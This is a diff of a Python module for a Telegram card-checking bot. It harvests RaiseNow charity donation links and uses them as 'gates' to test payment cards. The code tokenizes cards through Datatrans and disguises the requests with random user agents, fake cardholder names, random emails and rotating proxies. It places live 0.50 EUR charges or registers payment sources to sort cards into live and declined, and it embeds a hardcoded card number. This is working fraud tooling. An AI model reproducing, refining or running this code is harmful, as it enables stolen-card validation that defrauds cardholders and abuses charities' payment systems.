@@ -1,321 +1,398 @@
-# multi_link_checker.py
-# Contains all logic for the special multi-link checking mode.
-
-import requests
 import json
 import os
 import random
+import re
 import time
+import asyncio
 import logging
 from urllib.parse import urlparse
 
-# Setup logger
+import requests
+from telegram import InlineKeyboardButton, InlineKeyboardMarkup
+
+# --- CONFIGURATION ---
+LINK_FILE = "dynamic_links.json"
+TEST_CARD = "5168155124645796|9|2028|462" # Test card for link validation
+ADMIN_ID = 5127429005 # Ensure this matches your main file's ADMIN_ID
+
+# --- HELPER FUNCTIONS ---
+# These functions are imported from main.py, so we recreate simplified versions or placeholders
+# In a real integrated scenario, you'd likely share these from a common 'utils.py'
 logger = logging.getLogger(__name__)
 
-# --- Constants ---
-LINKS_FILE = "dalinks.json"
-MODE_FILE = "dalink_mode.json"
-TEST_CARD = "5168155124645796|9|2028|462" # Test card for validation
-
-# --- Helper functions (to avoid circular import) ---
 def generate_random_string(length=8):
     """Generates a random string of characters."""
-    import string
-    letters = string.ascii_lowercase
+    letters = "abcdefghijklmnopqrstuvwxyz"
     return ''.join(random.choice(letters) for _ in range(length))
+
+def random_email():
+    """Generates a random email address."""
+    prefix = ''.join(random.choices("abcdefghijklmnopqrstuvwxyz" + "0123456789", k=random.randint(8, 15)))
+    domain = ''.join(random.choices("abcdefghijklmnopqrstuvwxyz", k=random.randint(5, 10)))
+    return f"{prefix}@{domain}.com"
 
 def random_user_agent():
     """Generates a random realistic User-Agent string."""
     chrome_major = random.randint(100, 125)
     chrome_build = random.randint(0, 6500)
     chrome_patch = random.randint(0, 250)
+    safari_version = f"{random.randint(537, 605)}.{random.randint(36, 99)}"
+    chrome_version = f"{chrome_major}.0.{chrome_build}.{chrome_patch}"
     return (
-        f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
-        f"Chrome/{chrome_major}.0.{chrome_build}.{chrome_patch} Safari/537.36"
+        f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
+        f"AppleWebKit/{safari_version} (KHTML, like Gecko) "
+        f"Chrome/{chrome_version} Safari/{safari_version}"
     )
 
-# --- State Management ---
-def get_dalink_status():
-    """Gets the current status of the DaLink mode."""
-    if not os.path.exists(MODE_FILE):
-        return {'enabled': False, 'mode': 'charge'}
-    try:
-        with open(MODE_FILE, "r", encoding='utf-8') as f:
-            return json.load(f)
-    except (json.JSONDecodeError, FileNotFoundError):
-        return {'enabled': False, 'mode': 'charge'}
+def make_request_with_retry(session, method, url, max_retries=5, **kwargs):
+    """Simplified request function for this module."""
+    last_exception = None
+    for attempt in range(max_retries):
+        try:
+            response = session.request(method, url, timeout=20, **kwargs)
+            return response, None
+        except requests.exceptions.RequestException as e:
+            last_exception = e
+            logger.warning(f"Request attempt {attempt + 1}/{max_retries} failed: {e}. Retrying...")
+            time.sleep(attempt + 1)
+    error_message = f"All {max_retries} retry attempts failed. Last error: {last_exception}"
+    logger.error(error_message)
+    return None, error_message
 
-def set_dalink_status(enabled: bool, mode: str = None):
-    """Sets the status for DaLink mode."""
-    status = get_dalink_status()
-    status['enabled'] = enabled
-    if mode in ['live', 'charge']:
-        status['mode'] = mode
-    with open(MODE_FILE, "w", encoding='utf-8') as f:
-        json.dump(status, f, indent=4)
-
-# --- Link Data Management ---
+# --- LINK MANAGEMENT ---
 def load_links():
-    """Loads the list of validated links."""
-    if not os.path.exists(LINKS_FILE):
+    """Loads the list of dynamic links from a JSON file."""
+    if not os.path.exists(LINK_FILE):
         return []
     try:
-        with open(LINKS_FILE, "r", encoding='utf-8') as f:
+        with open(LINK_FILE, "r", encoding='utf-8') as f:
             return json.load(f)
     except (json.JSONDecodeError, FileNotFoundError):
         return []
 
 def save_links(links):
-    """Saves the list of links."""
-    with open(LINKS_FILE, "w", encoding='utf-8') as f:
+    """Saves the list of dynamic links to a JSON file."""
+    with open(LINK_FILE, "w", encoding='utf-8') as f:
         json.dump(links, f, indent=4)
 
-def delete_link(index_to_delete):
-    """Deletes a link by its index."""
-    links = load_links()
-    if 0 <= index_to_delete < len(links):
-        deleted_link = links.pop(index_to_delete)
-        save_links(links)
-        return deleted_link
+def _format_proxy_for_requests(proxy_str):
+    """Converts a proxy string to a dict format for the requests library."""
+    if not proxy_str: return None
+    parts = proxy_str.strip().split(':')
+    if len(parts) == 2:
+        proxy_url = f"http://{parts[0]}:{parts[1]}"
+        return {"http": proxy_url, "https": proxy_url}
+    elif len(parts) == 4:
+        proxy_url = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
+        return {"http": proxy_url, "https": proxy_url}
     return None
 
-def delete_all_links():
-    """Deletes all saved links."""
-    save_links([])
+def _get_session_with_proxy(main_bot_proxy_config):
+    """Creates a requests session, adding a proxy if enabled."""
+    session = requests.Session()
+    if main_bot_proxy_config.get("enabled") and main_bot_proxy_config.get("proxies"):
+        try:
+            proxy_str = random.choice(main_bot_proxy_config["proxies"])
+            proxy_dict = _format_proxy_for_requests(proxy_str)
+            if proxy_dict:
+                session.proxies = proxy_dict
+                logger.info("Link validation will use a proxy.")
+        except IndexError:
+            logger.warning("Proxy is enabled, but the proxy list is empty.")
+    return session
 
-def get_random_link():
-    """Gets a single random link's data from storage."""
-    links = load_links()
-    if not links:
-        return None
-    return random.choice(links)
-
-# --- Core Logic ---
-def validate_and_add_link(session, link_url):
-    """
-    Validates a Raisenow link and adds it to the list if it's functional.
-    Returns a status string.
-    """
+async def _validate_and_add_link(link_url, context, chat_id, main_bot_proxy_config):
+    """The core validation logic for a single link."""
     try:
-        # 1. Extract code from URL
-        parsed_url = urlparse(link_url)
-        cd = parsed_url.path.strip('/')
-        if not cd:
-            return f"'{link_url}' -> Invalid URL format."
+        short_code = urlparse(link_url).path.strip('/')
+        if not short_code:
+            await context.bot.send_message(chat_id, f"❌ Invalid URL format: `{link_url}`. Could not extract code.")
+            return
 
-        # Check for duplicates
-        existing_links = load_links()
-        if any(link['cd'] == cd for link in existing_links):
-            return f"'{cd}' -> Link already exists."
+        session = _get_session_with_proxy(main_bot_proxy_config)
 
-        # 2. Get identifiers from RaiseNow
-        identifier_url = f"https://api.raisenow.io/short-identifiers/{cd}"
+        # Step 1: Get identifiers from RaiseNow
+        identifier_url = f"https://api.raisenow.io/short-identifiers/{short_code}"
         headers = {"User-Agent": random_user_agent()}
         
-        response = session.get(identifier_url, headers=headers, timeout=20)
+        response, error = await asyncio.to_thread(make_request_with_retry, session, 'get', identifier_url, headers=headers)
+
+        if error or not response:
+            await context.bot.send_message(chat_id, f"❌ Failed to fetch data for `{short_code}`. Error: `{error}`")
+            return
+
         if response.status_code != 200:
-            return f"'{cd}' -> Failed to fetch identifiers (Status: {response.status_code})."
+            await context.bot.send_message(chat_id, f"❌ Error for `{short_code}`. Status: `{response.status_code}`\nResponse:\n`{response.text[:500]}`")
+            return
         
-        resp_json = response.json()
-        payload = resp_json.get("payload", {})
+        try:
+            data = response.json()
+        except json.JSONDecodeError:
+            await context.bot.send_message(chat_id, f"❌ Failed to parse JSON response for `{short_code}`.")
+            return
         
-        # 3. Check for "card" method and extract data
+        payload = data.get("payload", {})
         payment_methods = payload.get("payment_methods", [])
         card_method = next((m for m in payment_methods if m.get("method_name") == "card"), None)
 
         if not card_method:
-            return f"'{cd}' -> Does not support card payments."
+            await context.bot.send_message(chat_id, f"ℹ️ Link for `{short_code}` does not support card payments. Skipping.")
+            return
 
         account_uuid = payload.get("account_uuid")
-        solution_uuid = payload.get("solution_uuid")
         profile = card_method.get("profile")
 
         if not all([account_uuid, profile]):
-            return f"'{cd}' -> Missing essential data (account_uuid or profile)."
-
-        # 4. Perform test CHARGE using TEST_CARD
-        card_number, exp_month, exp_year, cvv = TEST_CARD.split('|')
-        if len(exp_year) == 4: exp_year = exp_year[-2:]
-
-        # Step 4a: Tokenize card with Datatrans
-        user_agent = random_user_agent()
-        tokenize_url = "https://pay.datatrans.com/upp/payment/SecureFields/paymentField"
-        tokenize_data = {
-            "mode": "TOKENIZE", "formId": "250808045911239489", "cardNumber": card_number,
-            "cvv": cvv, "paymentMethod": "ECA", "merchantId": "3000022877",
-            "browserUserAgent": user_agent,
-        }
-        tokenize_headers = {
-            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://pay.datatrans.com",
-            "Referer": "https://pay.datatrans.com/", "User-Agent": user_agent
-        }
-        token_response = session.post(tokenize_url, data=tokenize_data, headers=tokenize_headers, timeout=20)
-        token_json = token_response.json()
-        transaction_id = token_json.get("transactionId")
-        if not transaction_id:
-            error_msg = token_json.get("error", {}).get("message", "Tokenization failed")
-            return f"'{cd}' -> Test Failed (Tokenize): {error_msg}"
-
-        # Step 4b: Attempt payment
-        payment_url = "https://api.raisenow.io/payments"
-        payment_payload = {
-            "account_uuid": account_uuid, "test_mode": False, "create_supporter": False,
-            "amount": {"currency": "EUR", "value": 50},
-            "supporter": {"locale": "en", "first_name": "John", "last_name": "Doe"},
-            "payment_information": {
-                "brand_code": "eca", "cardholder": "John Doe", "expiry_month": exp_month,
-                "expiry_year": f"20{exp_year}", "transaction_id": transaction_id,
-            },
-            "profile": profile, "return_url": f"https://donate.raisenow.io/{cd}?lng=en&rnw-view=payment_result",
-        }
-        payment_headers = {
-            "Content-Type": "application/json", "Origin": "https://donate.raisenow.io",
-            "Referer": f"https://donate.raisenow.io/", "User-Agent": user_agent
-        }
-
-        # 5. Handle responses
-        for attempt in range(6): # Retry for 405
-            payment_response = session.post(payment_url, json=payment_payload, headers=payment_headers, timeout=25)
-            if payment_response.status_code == 405 and attempt < 5:
-                time.sleep(2)
-                continue
-            break # Exit loop on any other status or last attempt
+            await context.bot.send_message(chat_id, f"❌ Missing crucial info for `{short_code}` (account_uuid or profile). Skipping.")
+            return
+            
+        # Step 2: Perform a test charge to validate the payload
+        test_cc, test_mes, test_ano, test_cvv = TEST_CARD.split('|')
         
-        if payment_response.status_code == 400:
-            return f"'{cd}' -> Link does not support this payload (Error 400)."
-        
-        try:
-            payment_resp_json = payment_response.json()
-        except json.JSONDecodeError:
-            return f"'{cd}' -> Test charge failed. Non-JSON Response (Status: {payment_response.status_code})"
-
-        payment_status = payment_resp_json.get("payment_status")
-        
-        if payment_status == "failed":
-            # 6. If OK, add to list
-            new_link_data = {
-                "cd": cd,
+        status, _, response_text, _ = await asyncio.to_thread(
+            check_card_dalink,
+            session, TEST_CARD, test_cc, test_mes, test_ano, test_cvv, {}, None,
+            'charge', # Force charge mode for validation
+            { # Manually provide the link data for this test
+                "code": short_code,
                 "account_uuid": account_uuid,
-                "profile": profile,
-                "solution_uuid": solution_uuid,
-                "original_url": link_url
+                "profile": profile
             }
-            existing_links.append(new_link_data)
-            save_links(existing_links)
-            return f"'{cd}' -> Link OK. Added successfully."
-        else:
-            return f"'{cd}' -> Test charge did not fail as expected. Status: {payment_status}."
+        )
+        
+        if status in ['success', 'decline']:
+            links = load_links()
+            if any(l['code'] == short_code for l in links):
+                await context.bot.send_message(chat_id, f"ℹ️ Link for `{short_code}` is already in the database.")
+            else:
+                new_link_data = {
+                    "code": short_code,
+                    "account_uuid": account_uuid,
+                    "profile": profile,
+                    "url": link_url
+                }
+                links.append(new_link_data)
+                save_links(links)
+                await context.bot.send_message(chat_id, f"✅ **Link OK!** Successfully added `{short_code}`.")
+        
+        elif status == 'error' and "400 Client Error" in response_text:
+             await context.bot.send_message(chat_id, f"❌ **Link Payload Error!**\nLink `{short_code}` returned a 400 Bad Request. This usually means the payload structure is not supported.\n\nFailing URL: `{link_url}`")
+        
+        elif status == 'error' and any(code in response_text for code in ["405 Client Error", "503 Server Error"]):
+            await context.bot.send_message(chat_id, f"🟠 **Link Retry Failure!**\nLink `{short_code}` failed after multiple retries (Status 405/503). It might be temporarily unavailable. Not added.")
+        
+        else: # Other errors
+            await context.bot.send_message(chat_id, f"❓ **Unknown Validation Error!**\nLink `{short_code}` could not be validated.\nStatus: `{status}`\nResponse: `{response_text[:500]}`")
 
-    except requests.exceptions.RequestException as e:
-        return f"'{link_url}' -> Network Error: {e}"
-    except (json.JSONDecodeError, KeyError) as e:
-        return f"'{link_url}' -> API Response Error: {e}"
     except Exception as e:
-        logger.error(f"Unexpected error in validate_and_add_link: {e}", exc_info=True)
-        return f"'{link_url}' -> An unexpected error occurred."
+        logger.error(f"Critical error in _validate_and_add_link for {link_url}: {e}", exc_info=True)
+        await context.bot.send_message(chat_id, f"⛔️ A system error occurred while processing `{link_url}`.")
 
 
-def check_card_dalink(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, mode):
+async def addlink_command_worker(update, context, load_proxies_func):
+    """Worker for the /addlink command."""
+    if update.effective_user.id != ADMIN_ID: return
+
+    # Extract links from arguments or message text
+    if context.args:
+        text_content = " ".join(context.args)
+    else:
+        text_content = update.message.text.split('/addlink', 1)[-1].strip()
+
+    if not text_content:
+        await update.message.reply_text("Usage: `/addlink <url1> <url2>...`\nOr reply with `/addlink` to a message containing URLs.")
+        return
+
+    # Regex to find all URLs in the provided text
+    urls = re.findall(r'https?://[^\s]+', text_content)
+    if not urls:
+        await update.message.reply_text("No valid URLs found.")
+        return
+        
+    await update.message.reply_text(f"Found `{len(urls)}` link(s). Starting validation... (This may take a moment)")
+    
+    proxy_config = load_proxies_func()
+
+    for url in urls:
+        await _validate_and_add_link(url.strip(), context, update.effective_chat.id, proxy_config)
+        await asyncio.sleep(1) # Small delay to prevent rate-limiting
+
+    await update.message.reply_text("✅ Link validation process complete.")
+
+
+async def deletelink_command_worker(update, context):
+    """Worker for the /deletelink command."""
+    if update.effective_user.id != ADMIN_ID: return
+    
+    links = load_links()
+    if not links:
+        await update.message.reply_text("📭 The dynamic link list is empty.")
+        return
+        
+    keyboard = []
+    for i, link_data in enumerate(links):
+        # Displaying the last 15 chars of the URL for brevity
+        url_display = link_data.get('url', '...'+link_data['code'])
+        button_text = f"🗑️ {url_display}"
+        keyboard.append([InlineKeyboardButton(button_text[:50], callback_data=f"dellink_{i}")])
+    
+    keyboard.append([InlineKeyboardButton("❌ DELETE ALL LINKS ❌", callback_data="dellink_all")])
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    await update.message.reply_text("Select a link to delete:", reply_markup=reply_markup)
+
+
+def check_card_dalink(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, mode, forced_link_data=None):
     """
-    Performs a card check using a randomly selected validated link.
-    'mode' should be 'charge' or 'live'.
+    Main checking logic for the dynamic link mode.
+    Inspired by _check_card_gate1.
+    `forced_link_data` is used only for validation.
     """
-    # 1. Get random link data
-    link_data = get_random_link()
-    if not link_data:
-        return 'error', line, "DaLink Error: No validated links available. Please use /addlink.", bin_info
-
     try:
+        links = load_links()
+        if not links and not forced_link_data:
+            return 'error', line, "Dynamic link list is empty. Add links with /addlink.", bin_info
+
+        if forced_link_data:
+            link_to_use = forced_link_data
+        else:
+            link_to_use = random.choice(links)
+
+        account_uuid = link_to_use['account_uuid']
+        profile_id = link_to_use['profile']
+        short_code = link_to_use['code']
+
         user_agent = random_user_agent()
-        first_name = generate_random_string(8)
-        last_name = generate_random_string(10)
+        
+        # Random personal info
+        first_name = generate_random_string(random.randint(12, 20))
+        last_name = generate_random_string(random.randint(10, 20))
         cardholder = f"{first_name} {last_name}"
+        email = random_email()
 
-        # 2. Tokenize card with Datatrans
+        # Step 1: Tokenize card (This part is fairly standard)
         tokenize_url = "https://pay.datatrans.com/upp/payment/SecureFields/paymentField"
-        tokenize_data = {
-            "mode": "TOKENIZE", "formId": "250808045911239489", "cardNumber": cc,
-            "cvv": cvv, "paymentMethod": "ECA", "merchantId": "3000022877",
-            "browserUserAgent": user_agent,
-        }
         tokenize_headers = {
-            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://pay.datatrans.com",
-            "Referer": "https://pay.datatrans.com/", "User-Agent": user_agent
+            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+            "Origin": "https://pay.datatrans.com",
+            "Referer": "https://pay.datatrans.com/upp/payment/SecureFields/paymentField",
+            "User-Agent": user_agent,
+            "X-Requested-With": "XMLHttpRequest"
         }
-        
-        token_response = session.post(tokenize_url, data=tokenize_data, headers=tokenize_headers, timeout=20)
-        if cancellation_event and cancellation_event.is_set(): return 'cancelled', line, 'User cancelled', bin_info
-        
-        token_data = token_response.json()
-        if "error" in token_data:
-            return 'decline', line, token_data["error"].get("message", "Datatrans Tokenize Error"), bin_info
-        transaction_id = token_data.get("transactionId")
-        if not transaction_id:
-            return 'error', line, "Datatrans Tokenize Error: No transactionId", bin_info
+        # Using a randomly generated formId as it seems less critical
+        form_id = f"250808{''.join(random.choices('0123456789', k=12))}"
 
-        # 3. Build payload and select URL based on mode
+        tokenize_payload = {
+            "mode": "TOKENIZE",
+            "formId": form_id,
+            "cardNumber": cc,
+            "cvv": cvv,
+            "paymentMethod": "ECA",
+            "merchantId": "3000022877", # This seems to be a constant merchant ID
+            "browserUserAgent": user_agent,
+            "browserJavaEnabled": "false",
+            "browserLanguage": "en-US",
+            "browserColorDepth": "24",
+            "browserScreenHeight": "1152",
+            "browserScreenWidth": "2048",
+            "browserTZ": "-420"
+        }
+
+        token_response, error = make_request_with_retry(session, 'post', tokenize_url, data=tokenize_payload, headers=tokenize_headers, max_retries=3)
+        if error: return 'cancelled' if "cancelled" in error else 'error', line, f"Tokenize Error: {error}", bin_info
+        if not token_response: return 'error', line, "HTTP Error with no response during Tokenization", bin_info
+
+        if "Card number not allowed in production" in token_response.text:
+            return 'decline', line, 'CARD_NOT_ALLOWED_DECLINE', bin_info
+
+        try:
+            token_data = token_response.json()
+            if "error" in token_data and "message" in token_data.get("error", {}):
+                 return 'decline', line, token_data["error"]["message"], bin_info
+            transaction_id = token_data.get("transactionId")
+            if not transaction_id:
+                return 'decline', line, token_data.get("error", "Unknown error at Tokenize"), bin_info
+        except json.JSONDecodeError:
+            if token_response.status_code != 200:
+                return 'error', line, f"HTTP Error {token_response.status_code} during Tokenization. Response: {token_response.text}", bin_info
+            return 'error', line, "Tokenize response was not JSON", bin_info
+
+        # Step 2: Make request based on mode
         payment_headers = {
-            "Content-Type": "application/json", "Origin": "https://donate.raisenow.io",
-            "Referer": f"https://donate.raisenow.io/", "User-Agent": user_agent
+            "Accept": "application/json, text/plain, */*",
+            "Content-Type": "application/json",
+            "Origin": "https://donate.raisenow.io",
+            "Referer": "https://donate.raisenow.io/",
+            "User-Agent": user_agent
         }
         
+        # This payload is a generic structure. We will fill in the dynamic parts.
         base_payload = {
-            "account_uuid": link_data['account_uuid'],
+            "account_uuid": account_uuid,
             "test_mode": False,
             "create_supporter": False,
-            "amount": {"currency": "EUR", "value": 50},
-            "supporter": {"locale": "en", "first_name": first_name, "last_name": last_name},
-            "payment_information": {
-                "brand_code": "eca", "cardholder": cardholder, "expiry_month": mes.zfill(2),
-                "expiry_year": ano, "transaction_id": transaction_id,
+            "supporter": {
+                "locale": "en",
+                "first_name": first_name,
+                "last_name": last_name,
+                "email": email,
             },
-            "profile": link_data['profile'],
-            "return_url": f"https://donate.raisenow.io/{link_data['cd']}?lng=en&rnw-view=payment_result",
+            "payment_information": {
+                "brand_code": "eca",
+                "cardholder": cardholder,
+                "expiry_month": mes.zfill(2),
+                "expiry_year": ano,
+                "transaction_id": transaction_id
+            },
+            "profile": profile_id,
+            "return_url": f"https://donate.raisenow.io/{short_code}?lng=en&rnw-view=payment_result",
         }
 
+        # --- CHARGE MODE ---
         if mode == 'charge':
             payment_url = "https://api.raisenow.io/payments"
-            payment_payload = base_payload
-        elif mode == 'live':
-            payment_url = "https://api.raisenow.io/payment-sources"
-            payment_payload = base_payload
-            payment_payload['subscription'] = {"recurring_interval": "6 * *", "timezone": "Asia/Bangkok"}
-        else:
-            return 'error', line, f"DaLink Error: Invalid mode '{mode}'", bin_info
+            payment_payload = base_payload.copy()
+            payment_payload["amount"] = {"currency": "EUR", "value": 50} # Standard 0.5 EUR charge
 
-        # 4. Make the request
-        payment_response = session.post(payment_url, json=payment_payload, headers=payment_headers, timeout=25)
-        if cancellation_event and cancellation_event.is_set(): return 'cancelled', line, 'User cancelled', bin_info
-        
-        response_text = payment_response.text
-        
-        # 5. Parse response
-        if '{"message":"Forbidden"}' in response_text:
-            return 'gate_dead', line, f'GATE_DIED (Link: {link_data["cd"]})', bin_info
-        
-        try:
-            resp_json = payment_response.json()
-            # Charge mode responses
-            if mode == 'charge':
-                if resp_json.get("payment_status") == "succeeded":
-                    return 'success', line, f'CHARGED_50_DALINK_{link_data["cd"]}', bin_info
-                elif resp_json.get("payment_status") == "failed":
-                    return 'decline', line, response_text, bin_info
-                elif resp_json.get("action", {}).get("action_type") == "redirect":
-                    return 'custom', line, response_text, bin_info
+            # Use a higher retry count for charge validation, as per request
+            retries = 6 if forced_link_data else 3
+            payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, headers=payment_headers, max_retries=retries)
             
-            # Live mode responses
-            elif mode == 'live':
-                if resp_json.get("payment_source_status") == "pending":
-                     return 'live_success', line, response_text, bin_info
-                elif resp_json.get("payment_source_status") == "failed":
-                     return 'decline', line, response_text, bin_info
+            if error: return 'error', line, f"Payment Error: {error}", bin_info
+            if not payment_response: return 'error', line, "HTTP Error with no response during Payment", bin_info
+            
+            response_text = payment_response.text
+            
+            if payment_response.status_code == 400:
+                 return 'error', line, f"400 Client Error: Bad Request. The payload might be incompatible. Response: {response_text}", bin_info
+            if payment_response.status_code == 405:
+                 return 'error', line, f"405 Client Error: Method Not Allowed. Link may be unavailable. Response: {response_text}", bin_info
 
-            return 'unknown', line, response_text, bin_info
+            if '{"message":"Forbidden"}' in response_text: return 'gate_dead', line, f'GATE_DIED: Forbidden on link {short_code}', bin_info
+            
+            if '"payment_status":"succeeded"' in response_text: return 'success', line, f'CHARGED_50', bin_info
+            elif '"payment_status":"failed"' in response_text: return 'decline', line, response_text, bin_info
+            elif '"action":{"action_type":"redirect"' in response_text: return 'custom', line, response_text, bin_info
+            else: return 'unknown', line, response_text, bin_info
+        
+        # --- LIVE CHECK MODE ---
+        else: # 'live'
+            payment_url = "https://api.raisenow.io/payment-sources"
+            payment_payload = base_payload.copy()
+            # Live mode requires an amount, even if not charged
+            payment_payload["amount"] = {"currency": "EUR", "value": 50}
 
-        except json.JSONDecodeError:
-            return 'error', line, f"DaLink Error: Non-JSON response from {payment_url}", bin_info
+            payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, headers=payment_headers, max_retries=3)
+            
+            if error: return 'error', line, f"Payment Source Error: {error}", bin_info
+            if not payment_response: return 'error', line, "HTTP Error with no response during Payment Source", bin_info
+
+            response_text = payment_response.text
+            if '{"message":"Forbidden"}' in response_text: return 'gate_dead', line, f'GATE_DIED: Forbidden on link {short_code}', bin_info
+            
+            if '"payment_source_status":"pending"' in response_text: return 'live_success', line, response_text, bin_info
+            elif '"payment_source_status":"failed"' in response_text: return 'decline', line, response_text, bin_info
+            else: return 'unknown', line, response_text, bin_info
 
     except Exception as e:
-        logger.error(f"Error in check_card_dalink for line '{line}': {e}", exc_info=True)
+        logger.error(f"Unknown error in Dynamic Link Checker for line '{line}': {e}", exc_info=True)
         return 'error', line, f"DaLink System Error: {e}", bin_info
